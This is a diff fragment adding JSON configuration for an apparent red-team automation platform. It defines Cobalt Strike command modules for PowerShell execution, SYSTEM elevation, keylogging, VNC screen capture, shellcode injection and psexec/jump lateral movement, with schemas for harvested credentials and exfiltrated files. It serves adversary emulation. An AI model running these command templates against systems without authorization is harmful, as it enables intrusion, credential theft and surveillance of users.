+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "powershell", "execution", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Command_Output",
+              "collection": "Command_Output",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "ps_${run_id}_${step_id}",
+              "schema": {
+                "command": { "type": "string", "nullable": false },
+                "stdout": { "type": "string", "nullable": true },
+                "stderr": { "type": "string", "nullable": true },
+                "exitCode": { "type": "number", "nullable": true },
+                "timestamp": { "type": "datetime", "nullable": false },
+                "executionType": { "type": "string", "nullable": false, "default": "powershell" },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "beaconId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_powershell_import",
+          "id": "cs-powershell-import",
+          "name": "Import PowerShell Script",
+          "icon": "",
+          "tactic": "TA0002",
+          "mitre": { "tacticId": "TA0002", "techniqueId": "T1059.001" },
+          "category": "Cobalt Strike",
+          "subcategory": "PowerShell Execution",
+          "description": "Load PowerShell script into beacon memory",
+          "riskLevel": "medium",
+          "estimatedDuration": 20,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "powershell-import ${script_path}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Active beacon session"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "loaded_script",
+              "label": "Loaded Script",
+              "type": "PowerShell_Script",
+              "description": "Script now available in beacon memory"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "script_path",
+              "label": "Script Path",
+              "type": "file",
+              "required": true,
+              "placeholder": "/tools/PowerUp.ps1",
+              "default": null,
+              "description": "Path to PowerShell script file"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "powershell", "import", "staging", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "PowerShell_Script",
+              "collection": "PowerShell_Script",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "psscript_${run_id}_${step_id}",
+              "schema": {
+                "scriptName": { "type": "string", "nullable": false },
+                "scriptPath": { "type": "string", "nullable": false },
+                "functionsAvailable": {
+                  "type": "array",
+                  "nullable": true,
+                  "items": { "type": "string" }
+                },
+                "loadedTimestamp": { "type": "datetime", "nullable": false },
+                "beaconId": { "type": "string", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_getsystem",
+          "id": "cs-getsystem",
+          "name": "Elevate to SYSTEM",
+          "icon": "",
+          "tactic": "TA0004",
+          "mitre": { "tacticId": "TA0004", "techniqueId": "T1134" },
+          "category": "Cobalt Strike",
+          "subcategory": "Privilege Escalation",
+          "description": "Attempt to elevate beacon to SYSTEM privileges",
+          "riskLevel": "high",
+          "estimatedDuration": 30,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "getsystem",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Beacon with local admin rights"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "elevated_beacon",
+              "label": "Elevated Beacon",
+              "type": "Agent_Session",
+              "description": "Beacon now running as SYSTEM"
+            }
+          ],
+          "parameters": [],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "privilege-escalation", "system", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Agent_Session",
+              "collection": "Agent_Session",
+              "create": false,
+              "keyStrategy": "update_existing",
+              "schema": {
+                "privilegeLevel": { "type": "string", "nullable": false, "default": "system" },
+                "userContext": { "type": "string", "nullable": false, "default": "SYSTEM" },
+                "elevatedAt": { "type": "datetime", "nullable": false }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_vnc",
+          "id": "cs-vnc",
+          "name": "VNC Desktop Viewer",
+          "icon": "",
+          "tactic": "TA0009",
+          "mitre": { "tacticId": "TA0009", "techniqueId": "T1113" },
+          "category": "Cobalt Strike",
+          "subcategory": "Collection",
+          "description": "Stream live desktop view from target",
+          "riskLevel": "medium",
+          "estimatedDuration": 60,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "vnc ${port}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Active beacon session"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "vnc_session",
+              "label": "VNC Session",
+              "type": "VNC_Stream",
+              "description": "Active VNC stream reference"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "port",
+              "label": "VNC Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "5900",
+              "default": 5900,
+              "description": "Port for VNC connection"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "collection", "vnc", "desktop", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "VNC_Stream",
+              "collection": "VNC_Stream",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "vnc_${run_id}_${step_id}",
+              "schema": {
+                "port": { "type": "number", "nullable": false },
+                "connectUrl": { "type": "string", "nullable": true },
+                "startedAt": { "type": "datetime", "nullable": false },
+                "status": { "type": "string", "nullable": false, "default": "active" },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "beaconId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_keylogger",
+          "id": "cs-keylogger",
+          "name": "Start Keylogger",
+          "icon": "",
+          "tactic": "TA0009",
+          "mitre": { "tacticId": "TA0009", "techniqueId": "T1056.001" },
+          "category": "Cobalt Strike",
+          "subcategory": "Collection",
+          "description": "Capture keystrokes from target user",
+          "riskLevel": "high",
+          "estimatedDuration": 300,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "keylogger ${pid}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Target Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Active beacon session"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "keylog_stream",
+              "label": "Keylog Data",
+              "type": "Keylog_Stream",
+              "description": "Stream of captured keystrokes"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "pid",
+              "label": "Target Process ID",
+              "type": "number",
+              "required": true,
+              "placeholder": "1234",
+              "default": null,
+              "description": "PID to inject keylogger into"
+            },
+            {
+              "id": "duration",
+              "label": "Duration (seconds)",
+              "type": "number",
+              "required": true,
+              "placeholder": "300",
+              "default": 300,
+              "description": "How long to capture"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "collection", "keylogger", "input-capture", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Keylog_Stream",
+              "collection": "Keylog_Stream",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "keylog_${run_id}_${step_id}",
+              "schema": {
+                "targetPid": { "type": "number", "nullable": false },
+                "keystrokes": { "type": "string", "nullable": true },
+                "startedAt": { "type": "datetime", "nullable": false },
+                "endedAt": { "type": "datetime", "nullable": true },
+                "duration": { "type": "number", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" },
+                    "beaconId": { "type": "string", "nullable": true }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_psexec",
+          "id": "cs-psexec",
+          "name": "PsExec Lateral Movement",
+          "icon": "",
+          "tactic": "TA0008",
+          "mitre": { "tacticId": "TA0008", "techniqueId": "T1021.002" },
+          "category": "Cobalt Strike",
+          "subcategory": "Lateral Movement",
+          "description": "Move laterally using PsExec service execution",
+          "riskLevel": "high",
+          "estimatedDuration": 60,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "psexec ${target_host} ${service_name} ${listener}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Source Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Beacon on source system"
+            },
+            {
+              "id": "credentials",
+              "label": "Credentials",
+              "type": "Credential_Set",
+              "required": false,
+              "description": "Optional credentials for authentication"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "new_beacon",
+              "label": "Remote Beacon",
+              "type": "Agent_Session",
+              "description": "Beacon on target system"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "target_host",
+              "label": "Target Host",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.50",
+              "default": null,
+              "description": "Target system IP or hostname"
+            },
+            {
+              "id": "service_name",
+              "label": "Service Name",
+              "type": "string",
+              "required": false,
+              "placeholder": "beacon_svc",
+              "default": "beacon_svc",
+              "description": "Windows service name"
+            },
+            {
+              "id": "listener",
+              "label": "Listener",
+              "type": "string",
+              "required": true,
+              "placeholder": "http-listener-01",
+              "default": null,
+              "description": "Listener for new beacon"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "lateral-movement", "psexec", "service", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Agent_Session",
+              "collection": "Agent_Session",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "beacon_lateral_${run_id}_${step_id}",
+              "schema": {
+                "beaconId": { "type": "string", "nullable": false },
+                "hostname": { "type": "string", "nullable": true },
+                "internalIp": { "type": "string", "nullable": true },
+                "lateralMovementMethod": { "type": "string", "nullable": false, "default": "psexec" },
+                "sourceBeaconId": { "type": "string", "nullable": true },
+                "createdAt": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_inject",
+          "id": "cs-inject",
+          "name": "Inject into Process",
+          "icon": "",
+          "tactic": "TA0004",
+          "mitre": { "tacticId": "TA0004", "techniqueId": "T1055" },
+          "category": "Cobalt Strike",
+          "subcategory": "Process Injection",
+          "description": "Inject shellcode into running process",
+          "riskLevel": "high",
+          "estimatedDuration": 25,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "inject ${pid} ${architecture} ${listener}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Source Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Beacon to inject from"
+            },
+            {
+              "id": "process_list",
+              "label": "Process List",
+              "type": "Process_List",
+              "required": false,
+              "description": "Should run 'ps' first to identify target PID"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "injected_beacon",
+              "label": "Injected Beacon",
+              "type": "Agent_Session",
+              "description": "New beacon in target process"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "pid",
+              "label": "Target Process ID",
+              "type": "number",
+              "required": true,
+              "placeholder": "1234",
+              "default": null,
+              "description": "PID to inject into"
+            },
+            {
+              "id": "architecture",
+              "label": "Architecture",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "x64",
+              "options": ["x86", "x64"],
+              "description": "Target process architecture"
+            },
+            {
+              "id": "listener",
+              "label": "Listener",
+              "type": "string",
+              "required": true,
+              "placeholder": "http-listener-01",
+              "default": null,
+              "description": "Listener for injected beacon"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "injection", "process-hollowing", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Agent_Session",
+              "collection": "Agent_Session",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "beacon_inject_${run_id}_${step_id}",
+              "schema": {
+                "beaconId": { "type": "string", "nullable": false },
+                "processId": { "type": "number", "nullable": false },
+                "injectionMethod": { "type": "string", "nullable": false, "default": "inject" },
+                "sourceBeaconId": { "type": "string", "nullable": true },
+                "createdAt": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        
+        {
+          "_key": "lib_cs_lateral_move",
+          "id": "cs-lateral-move",
+          "name": "Generic Lateral Movement",
+          "icon": "",
+          "tactic": "TA0008",
+          "mitre": { "tacticId": "TA0008", "techniqueId": null },
+          "category": "Cobalt Strike",
+          "subcategory": "Lateral Movement",
+          "description": "Move laterally using various techniques (WMI, WinRM, etc)",
+          "riskLevel": "high",
+          "estimatedDuration": 60,
+          "executionType": "cobalt_strike",
+          "cobaltStrikeCommand": "jump ${method} ${target} ${listener}",
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "beacon",
+              "label": "Source Beacon",
+              "type": "Agent_Session",
+              "required": true,
+              "description": "Beacon on source system"
+            },
+            {
+              "id": "credentials",
+              "label": "Credentials",
+              "type": "Credential_Set",
+              "required": false,
+              "description": "Optional credentials"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "new_beacon",
+              "label": "Remote Beacon",
+              "type": "Agent_Session",
+              "description": "Beacon on target system"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "method",
+              "label": "Lateral Movement Method",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "winrm",
+              "options": ["winrm", "wmi", "psexec_psh", "smb"],
+              "description": "Technique to use"
+            },
+            {
+              "id": "target",
+              "label": "Target Host",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.50",
+              "default": null,
+              "description": "Target system"
+            },
+            {
+              "id": "listener",
+              "label": "Listener",
+              "type": "string",
+              "required": true,
+              "placeholder": "http-listener-01",
+              "default": null,
+              "description": "Listener for new beacon"
+            }
+          ],
+          "requirements": {
+            "c2Server": true,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-08T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from CS command library",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["c2", "lateral-movement", "wmi", "winrm", "cobalt-strike"]
+          },
+          "outputObjects": [
+            {
+              "type": "Agent_Session",
+              "collection": "Agent_Session",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "beacon_jump_${run_id}_${step_id}",
+              "schema": {
+                "beaconId": { "type": "string", "nullable": false },
+                "hostname": { "type": "string", "nullable": true },
+                "lateralMovementMethod": { "type": "string", "nullable": false },
+                "sourceBeaconId": { "type": "string", "nullable": true },
+                "createdAt": { "type": "datetime", "nullable": false },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": { "type": "string" },
+                    "runId": { "type": "string" },
+                    "stepId": { "type": "string" }
+                  }
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    
+    {
+      "name": "ObjectType",
+      "documents": [
+        {
+          "_key": "C2_Listener",
+          "name": "C2_Listener",
+          "description": "Command and Control listener configuration",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "listenerName": { "type": "string" },
+              "protocol": { "type": "string" },
+              "port": { "type": "number" },
+              "status": { "type": "string" }
+            }
+          }
+        },
+        {
+          "_key": "Payload_Artifact",
+          "name": "Payload_Artifact",
+          "description": "Malicious executable or shellcode artifact",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "filePath": { "type": "string" },
+              "fileType": { "type": "string" },
+              "architecture": { "type": "string" },
+              "hashSha256": { "type": "string" }
+            }
+          }
+        },
+        {
+          "_key": "Agent_Session",
+          "name": "Agent_Session",
+          "description": "Handle to compromised host (beacon, agent, implant)",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "beaconId": { "type": "string" },
+              "hostname": { "type": "string" },
+              "internalIp": { "type": "string" },
+              "userContext": { "type": "string" },
+              "privilegeLevel": { "type": "string" }
+            }
+          }
+        },
+        {
+          "_key": "Command_Output",
+          "name": "Command_Output",
+          "description": "Result of command execution",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "command": { "type": "string" },
+              "stdout": { "type": "string" },
+              "stderr": { "type": "string" },
+              "exitCode": { "type": "number" }
+            }
+          }
+        },
+        {
+          "_key": "Credential_Set",
+          "name": "Credential_Set",
+          "description": "Collection of harvested credentials",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "credentials": { "type": "array" },
+              "timestamp": { "type": "datetime" },
+              "sourceHost": { "type": "string" }
+            }
+          }
+        },
+        {
+          "_key": "File_Handle",
+          "name": "File_Handle",
+          "description": "Reference to file on remote system",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "remotePath": { "type": "string" },
+              "fileSize": { "type": "number" },
+              "hashMd5": { "type": "string" }
+            }
+          }
+        },
+        {
+          "_key": "File_Data",
+          "name": "File_Data",
+          "description": "File content and metadata (exfiltrated)",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "localPath": { "type": "string" },
+              "originalPath": { "type": "string" },
+              "fileSize": { "type": "number" },
+              "mimeType": { "type": "string" }
+            }
+          }
+        },
+        {
+          "_key": "Network_Pivot",
+          "name": "Network_Pivot",
+          "description": "Network tunnel or proxy for pivoting",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "tunnelType": { "type": "string" },
+              "port": { "type": "number" },
+              "status": { "type": "string" }
+            }
+          }
+        },
+        {
+          "_key": "PowerShell_Script",
+          "name": "PowerShell_Script",
+          "description": "PowerShell script loaded in beacon memory",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "scriptName": { "type": "string" },
+              "scriptPath": { "type": "string" },
+              "functionsAvailable": { "type": "array" },
+              "beaconId": { "type": "string" }
+            }
+          }
+        },
+        {
+          "_key": "Process_List",
+          "name": "Process_List",
+          "description": "List of running processes on target",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "processes": { "type": "array" },
+              "timestamp": { "type": "datetime" }
+            }
+          }
+        },
+        {
+          "_key": "VNC_Stream",
+          "name": "VNC_Stream",
+          "description": "Active VNC desktop stream",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "port": { "type": "number" },
+              "connectUrl": { "type": "string" },
+              "status": { "type": "string" }
+            }
+          }
+        },
+        {
+          "_key": "Keylog_Stream",
+          "name": "Keylog_Stream",
+          "description": "Keystroke capture stream",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "targetPid": { "type": "number" },
+              "keystrokes": { "type": "string" },
+              "duration": { "type": "number" }
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
